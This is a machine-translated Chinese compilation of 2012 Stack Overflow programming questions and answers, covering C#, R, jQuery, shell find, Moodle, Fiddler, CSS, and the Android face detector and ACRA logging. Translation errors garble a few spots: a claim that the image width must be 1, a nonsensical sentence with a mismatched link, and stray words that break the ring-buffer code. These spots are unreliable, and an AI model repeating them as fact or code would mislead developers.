但是您仍然需要具有有效 SSL 证书的虚拟主机。（建议您也拥有自己的域，因为这里总是有关于人们阻止用户访问他们的应用程序的线程，因为他们运行应用程序的整个域被 Facebook 归类为垃圾邮件，即使这不是他们自己的错.)

# xml - XML/XSLT 的 IE9 呈现失败并出现错误 XSLT8690

> ID：13360283
> 
> 赞同：0
> 
> 时间：2012-11-13T11:52:29.313
> 
> 标签：xml, internet-explorer, xslt

我有一个用作 XML/XSL 文件对的网页。使用 IE9 - 版本 9.0.8112.16421。更新版本：9.0.10 (KB2744842) 在 Windows 2008 R2 上渲染失败

![在此处输入图像描述](../Images/079413acc2057e8d434fb3302175d265.png)

在脚本控制台中，我看到以下消息：

```
XSLT8690: The download of the specified resource has failed 
```

但在 Web 服务器日志中，我看到正在下载 XSLT 文件。

启用兼容性视图似乎可以解决渲染问题。

即使兼容性视图关闭，Windows 7（64 位）上的相同浏览器版本也可以毫无问题地呈现。

使用 HTTP 它工作正常，只有 HTTPS 失败。

正因为如此，我尝试了其他事情：导入证书，导入 CA 根证书，添加 HTTP 标头 X-UA-Compatible with IE=IE7, IE=EmulateIE7。

使用 IE 开发工具（又名 F12）我捕获了网络。这是失败系统的导出：

```
URL Method  Result  Type    Received    Taken   Initiator   Wait??  Start?? Request??   Response??  Cache read??    Gap??
https://antares/cgi_bin/SystemInfo/start    GET 200 text/xml    7.29 KB 94 ms   refresh 0   16  46  32  0   20
/cgi_bin/SystemInfo/systeminfo.xsl      (Aborted)   text/xsl    65 B    16 ms   (Pending...)    62  16  0   0   0   36
/cgi_bin/SystemInfo/systeminfo.xsl      (Aborted)   text/xsl    65 B    < 1 ms  (Pending...)    78  0   0   0   0   36 
```

和工作的一个：

```
URL Method  Result  Type    Received    Taken   Initiator   Wait??  Start?? Request??   Response??  Cache read??    Gap??
https://antares/cgi_bin/SystemInfo/start    GET 200 text/xml    7,29 KB 78 ms   click   0   0   0   31  0   107
/cgi_bin/SystemInfo/systeminfo.xsl  GET 200 text/xsl    6,84 KB 16 ms       62  0   0   16  0   107
/cgi_bin/SystemInfo/style.css   GET 200 text/css    1,50 KB 15 ms   <link rel="stylesheet" />   78  0   15  0   0   92
/cgi_bin/SystemInfo/color.css   GET 200 text/css    0,66 KB 15 ms   <link rel="stylesheet" />   78  15  0   0   0   92 
```

# entity-framework - 是否可以在项目中的目录上设置 TFS 签入权限？

> ID：13360285
> 
> 赞同：0
> 
> 时间：2012-11-13T11:52:48.520
> 
> 标签：entity-framework, tfs, permissions

为了防止实体框架迁移发生冲突，我们指定了一名团队成员来执行所有显式迁移并将它们签入解决方案。

[我在http://msdn.microsoft.com/en-us/library/ms252587(v=vs.110).aspx](http://msdn.microsoft.com/en-us/library/ms252587(v=vs.110).aspx)找不到任何东西

是否可以将 TFS 权限设置为仅允许特定团队成员的写入权限来添加/编辑特定目录下的文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T15:04:32.597

是的，这可以完成，但您很可能必须禁用文件夹上的组继承并专门添加用户，如果其他团队成员需要读取权限，您将需要分配适当的组。

在 Visual Studio 中选择要更改权限的文件夹：

右键单击--->选择安全--->取消选中要删除的组的继承权限->选择删除。根据需要重复

然后选择单选按钮 - Windows 用户或组 --> 查找用户 --> 检查您要分配的权限 ---> 单击添加按钮。根据需要重复

您还可以在文件夹上设置 TFS 电子邮件警报，以便团队主管监控文件夹上的任何活动。

# c# - C# 公共属性未处理的异常

> ID：13360288
> 
> 赞同：-2
> 
> 时间：2012-11-13T11:52:54.780
> 
> 标签：c#, asp.net

我正在动态加载控件并将文本传递给控件。但是当我设置公共财产时，我遇到了一个未经处理的异常。

我的控制是：

```
 using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace g247_Test.controls
{
    public partial class carousel_guards : System.Web.UI.UserControl
    {

        protected void Page_Load(object sender, EventArgs e)
        {

        }

        public String pcode
        {
            get
            {
                return pcode;
            }
            set
            {
                pcode = value;
            }
        }
    }
} 
```

加载上一页上的控件：

```
 carousel_guards webUserControl = (carousel_guards)Page.LoadControl("~/controls/carousel-guards.ascx");

            webUserControl.pcode = "rg402eg";
            phGuardsList.Controls.Add(webUserControl); 
```

错误发生在集合 { 说只是未处理的异常

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T11:53:51.110

您的属性正在引用自己。您可以将其更改为：

```
 public String pcode { get; set; } 
```

或者定义一个私有字符串字段并使用它：

```
private string _pcode;

public string Pcode
{
    get { return _pcode; }
    set { _pcode = value; }
} 
```

如果您以大写开头的属性名称也更好，（使用[Pascal 大小写](http://msdn.microsoft.com/en-us/library/x2dbyw72%28v=vs.71%29.aspx)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:55:54.447

这很可能是堆栈溢出异常。您基本上是在告诉返回返回本身，它会永远持续下去。

您可以按照 Habib 所说的操作并使用`get; set;`语法糖，但如果您想要更多控制，典型的处理方法是创建一个字段来存储值，如下所示：

```
private string _pcode;

public string pcode { get { return _pcode; } set { _pcode = value; } } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T11:54:34.627

执行 get 和 set 时，您引用的是属性本身；您应该 A) 有一个基础变量来保存调用者无法访问的值，或者使用 B)[自动实现的属性](http://msdn.microsoft.com/en-us/library/bb384054.aspx)。

```
private string _pcode
public String pcode {
  get { return _pcode; }
  set { _pcode = value; }
} 
```

或者，

```
public String pcode { get; set; } 
```

# r - R为什么按行名称和组件名称列出数据框中的元素会返回NA？

> ID：13360295
> 
> 赞同：7
> 
> 时间：2012-11-13T11:53:22.080
> 
> 标签：r

我创建了一个包含一列的数据框 dfrm，并将行名设置为：

```
v1 = c(1,2,3)
dfrm <- data.frame(v1)
row.names(dfrm) <- c("AD","BP","CD")

dfrm
   v1
AD  1
BP  2
CD  3 
```

我可以通过行名和索引访问元素：

```
dfrm$v1[1]
[1] 1 
```

我可以通过行名和引号中的组件名访问元素：

```
dfrm["AD","v1"]
[1] 1 
```

但是为什么我不能通过行名和组件名访问元素呢？

```
dfrm$v1["AD"]
[1] NA 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:00:41.773

答案是向量没有行名，尽管它们可以有名称。

当您将列作为列表项访问时，R 不会采取将行名传递给向量名称的额外步骤：

```
> dfrm$v1
[1] 1 2 3
> dfrm[["v1"]]
[1] 1 2 3
> dfrm[,"v1"]
[1] 1 2 3
> dfrm[,1]
[1] 1 2 3
> names(dfrm$v1)
NULL 
```

请注意，这可能是一件好事，因为有用的情况是有限的，并且每次 data.frame 有一个列被拉出时复制名称的开销可能不值得。

如果您想自己复制它们：

```
> vone <- dfrm$v1
> names(vone) <- rownames(dfrm)
> vone
AD BP CD 
 1  2  3 
```

# javascript - $(this) 和 event.target 不同但应该相同

> ID：13360301
> 
> 赞同：1
> 
> 时间：2012-11-13T11:54:01.870
> 
> 标签：javascript, jquery

我有以下代码将点击事件函数连接到提交按钮。我知道`event.target`并且`this`并不总是相同的（据我所知，这取决于事件附加到的位置以及实际触发它的人）但在这种情况下，事件附加到按钮并且按钮也触发了它，所以它们应该是相同。还是我错了？

```
 modals.init = function () {
    // wire up submit() function to the submit button
    modals.config.$submitBtn.on('click', submit);
  };

  function submit(event) {
    event.preventDefault();
    var $this = $(this);
    alert(event.target.id); // fine
    alert($this.id); // undefined
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T11:56:16.857

它是`$this.attr("id")`（jQuery 元素）或`this.id`（DOM 元素）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T11:57:35.477

是的，那么`this === event.target`。

但是如果你把它包装成一个`jQuery`包装器，它就没有任何`id`属性了。您可以使用`this.id`或`$(this).attr('id')`获取属性或`$(this).prop('id')`获取`this.id`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T11:56:15.593

在这种情况下，`this` 限定为被点击的元素，所以没有`.id`属性，它是被点击元素的 jQuery 表示。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-13T11:57:22.800

使用代码`$(this)`生成一个 jquery 对象，你必须使用 jquery 函数：`alert($this.attr("id));`.

# shell - 仅在文件存在时查找并删除

> ID：13360302
> 
> 赞同：0
> 
> 时间：2012-11-13T11:54:03.693
> 
> 标签：shell, unix

如果文件超过 60 天，我正在编写一个 shell 脚本来清除文件夹中的文件。我正在使用 find 命令来做到这一点。我还有一个要求，如果文件存在，那么脚本可以删除这些文件。如果没有超过 60 天的文件，我不希望我的命令给出任何错误消息。

`find AA* -mtime +60 -exec rm {} \;`

我正在使用上面给定的命令。如果没有文件早于 60 天以及它们不是以“AA”开头，它会给出错误消息“没有这样的文件或目录”。我不希望为我的命令报告任何此类消息。

请帮忙。

TIA。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:05:14.917

也许您缺少目标，即当前目录中的 AA* 文件？

怎么改成

```
find . -name 'AA*' -mtime +60 -exec rm {} \; 
```

或者，如果您只需要检查从“AA”开始的文件或目录，您可以使用 -regex：

```
find . -regex './AA.*' -mtime +60 -exec rm {} \; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:58:21.330

> 我不希望为我的命令报告任何此类消息。

将命令的标准错误重定向到`/dev/null`

```
... 2>/dev/null 
```

# forms - 为什么密码字段在错误时被清除？

> ID：13360303
> 
> 赞同：0
> 
> 时间：2012-11-13T11:54:04.030
> 
> 标签：forms, symfony, validation

当任何字段出现错误时，密码和密码确认字段都被清除，这对用户来说很烦人。

这是设计使然吗？为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T07:38:14.530

您必须将`always_empty`选项设置为 false。

[http://symfony.com/doc/2.1/reference/forms/types/password.html#always-empty](http://symfony.com/doc/2.1/reference/forms/types/password.html#always-empty)

# php - 登录首页前的 Moodle $OUTPUT 变量不起作用

> ID：13360307
> 
> 赞同：0
> 
> 时间：2012-11-13T11:54:33.927
> 
> 标签：php, moodle

我通过复制moodle/theme文件夹中的boxxie主题文件夹并将其重命名为我的主题来创建一个主题。现在我想拥有自己的登录前首页，所以在主题/mytheme/config.php 中，我将 $THEME->layouts 的“frontpage”文件从“frontpage.php”更改为“index.php”，其中索引.php 是**我的自定义 html 主题的索引页。**

我已将文件夹（css、js 等）放在主题的布局文件夹中，在从 moodle 管理部分选择主题后，它工作正常。

现在，问题是我对 about.php 和其他一些 php 页面使用了相同的主题。现在，每当我从浏览器打开 about.php 页面时，它都会显示 $OUTPUT 变量不可识别的错误，因为我在所有页面中使用 $OUTPUT->login_info() 方法来获取登录**信息**或**未登录**。

以下是在主题/mytheme/layout/index.php 中运行良好的代码（因为它包含在主 index.php 文件中）但在主题/mytheme/layout/about.php 中显示错误

```
<span style="font-size: 15px; color: #ffffff;"><?php echo $OUTPUT->login_info(); ?></span> 
```

**我试过什么？**

1.  将输出存储在会话变量 ($_SESSION['myoutputvar']) 中。

2.  创建一个全局变量并将 $OUTPUT 存储在该变量中。

但这一切都没有奏效。我知道问题所在，但找不到解决方案，经过数小时的搜索，我终于将其发布在这里。

所以，我很乐意从你们那里得到任何帮助。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T09:17:54.327

您需要检查布局配置文件布局值。

并且还需要在about.php中设置

```
$PAGE->set_pagelayout('frontpage'); 
```

# c# - 将 Fiddler 与 Windows 应用商店单元测试一起使用

> ID：13360309
> 
> 赞同：1
> 
> 时间：2012-11-13T11:54:34.147
> 
> 标签：c#, .net, visual-studio-2012, fiddler, windows-store-apps

我想运行 Fiddler 来帮助调试我正在开发的便携式 API 客户端。

在 Visual Studio 中，在 Windows 应用商店单元测试项目属性页 > 调试选项卡上，我检查了“允许本地网络环回”选项。

在商店单元测试期间运行的每个 Web 请求都会失败，并带有`System.Net.Sockets.SocketException`: `A connection attempt failed because the connected party did not properly respond after a period of time or established connection failed because connected host has failed to respond 127.0.0.1:8888`。

我要连接的 Uri 不是本地的 - 而是本地网络上的另一台机器 - 所以这个提琴手环回地址确实来自全局代理设置。

我知道对于[Windows 应用商店应用程序，您必须启用环回网络隔离豁免](http://blogs.msdn.com/b/fiddler/archive/2011/12/10/fiddler-windows-8-apps-enable-loopback-network-isolation-exemption.aspx)，并为此勾选 UI 中列出的每个应用程序容器（尽管它们都与 VS 或此单元测试项目无关） - 无济于事。

我还尝试在 Fiddler 中禁用 IPv6 - 不知道为什么我认为这可能会起作用，但值得一试 - 它也不起作用。

任何人有任何想法！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:12:29.923

好的-虽然我走在正确的轨道上，但认为必须为单元测试项目注册了一些应用程序容器-我没想到它可能仅*在 MSTest 运行*时才处于活动状态。

您需要调试 Windows Store 单元测试（项目中的任何测试）并在其中插入断点（以停止测试运​​行程序的执行），这样它就会出现在 Fiddlers 的 Loopback Extensions 工具中的 AppContainers 列表中。

所以 - 给定这个测试：

```
[TestMethod]
public async Task Example()
{
    var result = await GetSomeData(); //<-- breakpoint
    Assert.IsNotNull(result);
}

private async string GetSomeData()
{
    //TODO something that makes a web request with, say, HttpClient
} 
```

您所做的就是在上面显示的行处断点 - 然后从 Fiddler 启动“Win8 Config”选项 - 您将看到您的单元测试项目出现在 AppContainers 列表中。

为该应用程序容器启用环回，保存更改，然后继续进行单元测试 - 您应该会看到正确捕获的流量。

这样做一次之后，您似乎不必再这样做了-我已经关闭了提琴手并重新启动它，并且仍然正确捕获了流量。

然而，一个警告词，一旦你这样做，Loopback 豁免工具将抱怨为 SID 定义的豁免，如果它启动时没有 AppContainer ——除非你碰巧再次运行单元测试。

# css - 位置：绝对在选项卡式菜单上导致溢出问题

> ID：13360311
> 
> 赞同：1
> 
> 时间：2012-11-13T11:54:39.360
> 
> 标签：css, overflow, css-position, tabbed-view

当我`position: absolute`在选项卡式菜单中设置时，我遇到了溢出问题。

**[这是查看问题的链接](http://www.intracrop.co.uk/new-site-2/adjuvants.html)**（单击选项卡#one）

**[CSS](http://www.intracrop.co.uk/new-site-2/css/tabs.css)**

我尝试过各种 jQuery 和 JavaScript 选项卡式菜单，但它们与控制背景图像大小调整器的 java 冲突（我继承了试图修复其他人工作的站点）

这是CSS：

```
#tabs {margin: 10px auto;min-height: 250px; width: 560px;position: relative}
#tabs li div p {text-align: left}
#tabs a {color: #000;text-decoration: none;outline: none;}
#tabs ul {float: left;margin: 0;padding: 0; position: relative}
#tabs li {float: left;list-style-type: none;}
#tabs li a {
background: -webkit-gradient(linear, left top, left bottom, from(#bdccaa), to(#869968));
background: -moz-linear-gradient(center top , #bdccaa, #869968 18px) repeat scroll 0 0 transparent;
background: -o-linear-gradient(center top , #bdccaa, #869968 18px) repeat scroll 0 0 transparent;
background: -ms-linear-gradient(center top , #bdccaa, #869968 18px) repeat scroll 0 0 transparent;
background: linear-gradient(center top , #bdccaa, #869968 18px) repeat scroll 0 0 transparent;
border: 1px solid #d8e0cf;
border-bottom: 0px;
margin: 0;
padding: 4px 12px;
position: relative;
z-index: 1;
font-size: 90%;
-webkit-border-radius: 10px 10px 0 0;
-moz-border-radius: 10px 10px 0 0;
border-radius: 10px 10px 0 0;
display: block;
top: 1px;
box-shadow: 0px -1px 5px #aaa
}

#tabs li a:hover {
background: -webkit-gradient(linear, left top, left bottom, from(#e1efcf), to(#9cb178));
background: -moz-linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
background: -o-linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
background: -ms-linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
background: linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
}
#tabs #One:target a,#tabs #Two:target a,#tabs #Three:target a {
color: #000000;
border-bottom: none;
top: 1px;
background: -webkit-gradient(linear, left top, left bottom, from(#e1efcf), to(#9cb178));
background: -moz-linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
background: -o-linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
background: -ms-linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
background: linear-gradient(center top , #e1efcf 12px, #9cb178 25px) repeat scroll 0 0 transparent;
padding-top: 6px;
}
#tabs li div {
-webkit-transition: all 0.5s ease 0s;
-moz-transition: all 0.5s ease 0s;
-o-transition: all 0.5s ease 0s;
-ms-transition: all 0.5s ease 0s;
transition: all 0.5s ease 0s;
border: 0px solid #fff;
float: left;
-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
filter: alpha(opacity=0);
opacity: 0;
padding: 15px;
position: absolute;
visibility: hidden;
height: auto;
width: 530px;
left: 0;
background: -webkit-gradient(linear, left top, left bottom, from(#eee), to(#FFFFFF));
background: -moz-linear-gradient(center top , #eee, #FFFFFF 85px) repeat scroll 0 0 transparent;
background: -o-linear-gradient(center top , #eee, #FFFFFF 85px) repeat scroll 0 0 transparent;
background: -ms-linear-gradient(center top , #eee, #FFFFFF 85px) repeat scroll 0 0 transparent;
background: linear-gradient(center top , #eee, #FFFFFF 85px) repeat scroll 0 0 transparent;
box-shadow: 0px 0px 5px #888888;
-webkit-border-radius: 0px 10px 10px 10px;
-moz-border-radius: 0px 10px 10px 10px;
border-radius: 0px 10px 10px 10px;
}

#tabs #One:target div,#tabs #Two:target div,#tabs #Three:target div {-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
filter: alpha(opacity=100); opacity: 1; visibility: visible;} 
```

# html - HTML：如何在 iOS 设备中制作可复制的只读文本区域

> ID：13360314
> 
> 赞同：6
> 
> 时间：2012-11-13T11:54:58.333
> 
> 标签：html, ios, textarea, copy-paste, readonly

如何在 iOS 设备上制作可**突出显示**`textarea`和可**复制的内容？**`input type="text"`

 ****这不起作用：

```
<textarea readonly="readonly">Totally readonly, cannot be copied</textarea> 
```

也没有：

```
<textarea disabled="disabled">Totally readonly, cannot be copied</textarea> 
```

**编辑**：文本区域不断更新，因此一次性转换它是行不通的。

textarea 的内容也可以是 HTML。

我有一个 JSFiddle，我对此进行了测试：http: [//jsfiddle.net/sebnilsson/jfvWZ/](http://jsfiddle.net/sebnilsson/jfvWZ/)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T08:38:31.420

一种解决方案可能是找到页面上的所有只读文本区域，并呈现一个包含内容的 div 来代替只读字段。我写了一些非常简单的 JS 来演示这一点。

类似的东西

```
$('textarea[readonly]').removeAttr('readonly').each(function () {
    var $this = $(this);
    $this.hide().after('<div data-textarea="' + $this.attr('id')
        + '" class="textarea">' + $this.val() + '</div>');
}).on('textareachange', function () {
    var $this = $(this);
    $('[data-textarea="' + $this.attr('id') + '"]').html($this.val());
}); 
```

您还需要在更新 textarea 值时触发该事件。例如

```
$('textarea').val('test').trigger('textareachange'); 
```

这里有一个更广泛的示例，其中包含有关样式等的示例。

[http://jsfiddle.net/ssfUx/3/](http://jsfiddle.net/ssfUx/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T12:55:36.137

我已经成功地在我的 iPhone 上选择了一些文本，但需要多次尝试。

```
<textarea readonly onfocus="this.blur();">Totally readonly, CAN BE copied</textarea> 
```

最后一个：http: [//jsfiddle.net/jfvWZ/6/](http://jsfiddle.net/jfvWZ/6/)

```
<div>
    <label>Plain div</label><br />
    <div id="plain-div" onFocus="this.blur();">
        Plain div
    </div>
</div> 
```

易于在 iPhone 上选择文本

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-10T09:49:30.423

同样遇到了这个问题。

不确定以下是否是一个体面、正确或语义的替代方案，但它对我有用。

我只是将 textarea 更改为只读的 div，应用相同的样式。

一个缺点是在 JavaScript 中我无法使用 this['myForm'] 来定位 div。它似乎不是 DOM 中表单元素的子元素。

相反，我必须通过 id 获取元素并将其设置为 innerHTML，而不是像 textarea 那样设置值。

它适用于 Ipad 1 IOS5 和 Iphone 4s IOS7 我现在可以选择文本并将其复制到剪贴板。****

# c# - BindingNavigator 保存按钮不会将数据保存到数据库

> ID：13360317
> 
> 赞同：2
> 
> 时间：2012-11-13T11:55:05.303
> 
> 标签：c#, sql, database

我用 sql 数据库制作了一个 C# 程序。我使用数据源中的拖放创建了表单。但是当我按下保存按钮时，数据不会保存在数据库中。

![在此处输入图像描述](../Images/c82624c4f69685cf71c421239ae317e1.png)

自动创建的代码是

```
namespace test3
{
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
    }

    private void tableTest3BindingNavigatorSaveItem_Click(object sender, EventArgs e)
    {
        Validate();
        this.tableTest3BindingSource.EndEdit();
        this.tableAdapterManager.UpdateAll(this.test3DataSet);
        //this.tableTest3TableAdapter.Update(this.test3DataSet.TableTest3); // I tried to add this line but it also not work !!

    }

    private void Form1_Load(object sender, EventArgs e)
    {
        // TODO: This line of code loads data into the 'test3DataSet.TableTest3' table. You can move, or remove it, as needed.
        this.tableTest3TableAdapter.Fill(this.test3DataSet.TableTest3);

    }
}
} 
```

我是否必须添加一些代码或更改属性，顺便说一下，我按照网站中的步骤创建了数据库，它必须是正确的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:46:17.777

默认情况下，在解决方案资源管理器中，数据库设置为始终复制到 bin\debug 文件夹，这意味着数据库始终被应用程序文件夹中的数据库覆盖。

解决方案：您可以将此属性更改为 DO NOT COPY 并在需要时自行复制，或者将数据库保留在项目之外。当被要求在创建连接时将其引入项目时，sympy 说不。或者您应该将连接字符串目录更改为项目文件夹中的数据库，而不是调试文件夹中的数据库。那应该工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-01-20T04:45:44.140

在研究 Tony Gaddis 书中关于数据库的第 11 章中的“从 C# 开始”中的一个示例时，我遇到了同样的问题。

在数据库配置向导中选择我的数据库对象后，我收到一个窗口提示，询问我是否要将数据库复制到我的应用程序文件夹......

好吧，在我第二次尝试时，我点击了否，然后我尝试了保存按钮，它正在工作。所以，是的，放手吧。

# android - 让用户能够与屏幕上的“球”进行交互？

> ID：13360318
> 
> 赞同：3
> 
> 时间：2012-11-13T11:55:09.690
> 
> 标签：android, gestures

我正在尝试更多地了解 Android 中的手势和图形，所以我正在尝试制作一种游戏，你从屏幕中间的一个球（只是一个红色圆圈）开始，如果你向一个方向滑动，球会朝那个方向发射，屏幕弹跳等。现在，我已经成功检测到有人向某个方向滑动，目前我只是在屏幕上显示方向。我的问题是：我该如何继续？我怎样才能画出球，让用户能够移动它并让它从屏幕的两侧反弹？我想我需要以某种方式使用 onDraw，但我不确定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:59:33.527

有一个人有类似的问题，他设法让圆圈在屏幕上移动并从边缘反弹，你可以使用他的代码作为你的绘图和动画例程的基础：[在 android 中移动圆圈](https://stackoverflow.com/questions/13360021/moving-circles-in-android)

# android - “返回 0 个面孔，因为存在错误 btk_facefinder_putdcr” Android 人脸检测器中的错误

> ID：13360322
> 
> 赞同：3
> 
> 时间：2012-11-13T11:55:29.917
> 
> 标签：android, image-processing, face-detection

```
fd = new FaceDetector(mFaceWidth, mFaceHeight, MAX_FACES);
count = fd.findFaces(mFaceBitmap, faces); 
```

使用上面的代码，我在某些图像上遇到了这个错误。

> 返回 0 个面，因为存在错误 btk_facefinder_putdcr

有人能帮我吗？如何摆脱这个？

相同的代码适用于其他一些图像。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-08-25T03:09:37.463

[http://blogcs.net/devilkintails/8509767](http://blog.csdn.net/devilkin64/article/details/8509767) 是数数的图片/图片的丰富必须偶偶

```
Bitmap srcImg = BitmapFactory.decodeFile(imgUrl);
    Bitmap srcFace = srcImg.copy(Bitmap.Config.RGB_565, true);
    srcImg = null;
    int w = srcFace.getWidth();
    int h = srcFace.getHeight();
    if (w % 2 == 1) {
        w++;
        srcFace = Bitmap.createScaledBitmap(srcFace,
                srcFace.getWidth()+1, srcFace.getHeight(), false);
    }
    if (h % 2 == 1) {
        h++;
        srcFace = Bitmap.createScaledBitmap(srcFace,
                srcFace.getWidth(), srcFace.getHeight()+1, false);
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-07T06:15:25.337

如[本页](https://stackoverflow.com/questions/8171494/facedetector-error-exist-in-btk-facefinder-putdcr)所述，图像宽度需要均匀。我遇到了同样的问题，所以如果宽度是奇数，我将图像宽度缩放一倍。它开始工作了:)

```
 BitmapFactory.Options bitmap_options = new BitmapFactory.Options();
            bitmap_options.inPreferredConfig = Bitmap.Config.RGB_565;

            background_image = BitmapFactory.decodeFile(image_fn, bitmap_options);
            if((1==(background_image.getWidth()%2))){
                background_image = Bitmap.createScaledBitmap(background_image, 
                    background_image.getWidth()+1, background_image.getHeight(), false);
            }
            FaceDetector face_detector = new FaceDetector(
                                    background_image.getWidth(), background_image.getHeight(),
                                    MAX_FACES);
            faces = new FaceDetector.Face[MAX_FACES];
            face_count = face_detector.findFaces(background_image, faces);
            Log.d("Face_Detection", "Face Count: " + String.valueOf(face_count)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-13T13:13:46.463

如果您从图库和相机获取图像并且出现此错误，请检查应用面部检测的位图宽度，它必须为 1。

根据文档，`developers.android.com`如果图像宽度不均匀，则会发生此异常。有关更多详细信息，请查看[此](http://developer.android.com/reference/android/media/FaceDetector.html)链接。

或者，如果您没有从图库中获取图像并从相机拍摄，则将图像放置在可绘制的文件夹名称中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-29T02:12:50.757

我遇到了同样的问题，当我创建一个新的“drawable”文件夹来保存图像时，“drawable”末尾没有“-hdpi”，它起作用了。我现在唯一的问题是缩放图像以适应屏幕，但这应该相对简单。

希望这可以帮助。

# android - Logback-android 和 ACRA

> ID：13360323
> 
> 赞同：3
> 
> 时间：2012-11-13T11:55:32.190
> 
> 标签：android, logback, acra

我正在尝试设置我的应用程序，以便可以使用[logback-android](http://tony19.github.com/logback-android/)编写日志，然后使用[ACRA](http://acra.ch/)将它们发送到 Google Docs 。我认为这是可能的，但我遇到的一个问题是在哪里写日志。

这两个库都需要一个硬编码的文件名，所以我不能使用`getStorageDirectory()`. 所以，我的第一个问题是，如果您不指定完整路径，日志会写入哪里？我是否必须指定完整路径并将其硬编码为`/data/data/com.example/...`？

这是我的配置：

```
<!-- Logback configuration. -->
<logback>
<configuration>
    <appender
        name="FILE"
        class="ch.qos.logback.core.FileAppender" >
        <file>applog.log</file>
        <encoder>
            <pattern>[%method] %msg%n</pattern>
        </encoder>
    </appender>
    <appender
        name="LOGCAT"
        class="ch.qos.logback.classic.android.LogcatAppender" >
        <tagEncoder>
            <pattern>%logger{0}</pattern>
        </tagEncoder>

        <encoder>
            <pattern>[%method] %msg%n</pattern>
        </encoder>
    </appender>

    <root level="debug" >
        <appender-ref ref="FILE" />
        <appender-ref ref="LOGCAT" />
    </root>
</configuration>
</logback> 
```

对于阿克拉：

```
@ReportsCrashes(formKey = "dDB4dVRlTjVWa05T..........................",
                applicationLogFile = "applog.log",
                applicationLogFileLines = 150) 
```

但这会产生如下错误，所以很明显我确实需要一个绝对路径。我应该使用什么？

```
java.io.FileNotFoundException: /applog.log: open failed: EROFS (Read-only file system) 
```

最后一个稍微不相关的问题，我希望能够打印对象地址，例如 [%object :: %method] 会显示 [MyActivity@33c0d9d :: onCreate] 或类似的东西。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-16T07:25:18.863

还有另一种解决方法。

查看 ACRA 源文件[LogFileCollector.java](https://github.com/ACRA/acra/blob/master/src/main/java/org/acra/collector/LogFileCollector.java)。它以下列方式打开应用程序日志文件：

```
if (fileName.contains("/")) {
    reader = new BufferedReader(new InputStreamReader(new FileInputStream(fileName)), 1024);
} else {
    reader = new BufferedReader(new InputStreamReader(context.openFileInput(fileName)), 1024);
} 
```

可以使用 context.openFileOutput 保存日志消息并在 ACRA 配置中指定不带路径的日志文件名。即日志文件类可以通过以下方式声明：

```
public class LogOnDisk {
    public static final String LOG_FILE_NAME = "custom_log";
    private final java.io.FileOutputStream _FS;
    private final java.io.PrintStream _PS;
    public LogOnDisk(Context context) throws IOException {
        _FS = context.openFileOutput(LOG_FILE_NAME, Context.MODE_PRIVATE);
        _PS = new PrintStream(_FS);
    }

    public synchronized void toLog(String message) {
        try {           
            _PS.print(message + "\n");
            _PS.flush();
        } catch (Exception ex) {
            //nothing to do
        }
    }       
} 
```

ACRA 配置：

```
@ReportsCrashes(applicationLogFile = LogOnDisk.LOG_FILE_NAME)
public final class Kernel extends Application { 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:44:03.043

这不是解决方案，而是替代方案。

如果您有自己的日志记录层，则可以将最后 50/100/500 条日志消息存储在循环缓冲区中，并在崩溃发生时将其提供给 ACRA。

循环缓冲区实现示例：

```
public static final class LogRingBuffer {
    public static final int CAPACITY = 150;
    private String[] buffer = new String[CAPACITY];
    private int position = 0;
    private boolean full = false;
    public synchronized void append(String message) {cost of sync
        buffer[position] = message;
        position = (position+1)%CAPACITY;
        if (position==0) {
            full = true;
        }
    }

    public synchronized int size() {
        return full?CAPACITY:position;
    }

    public synchronized String get(int i) {
        return buffer[(position - i - 1 + CAPACITY) % CAPACITY];
    }
} 
```

然后您必须提供日志内容作为自定义数据字段：

```
int bcSize = Log.logBuffer.size();
for(int i=0; i<bcSize; ++i)
    reporter.addCustomData(String.format("LOG%03d", i), Log.logBuffer.get(i)); 
```

后一个应该在您自己的异常处理程序中实现，它应该围绕 ACRA 异常处理程序......

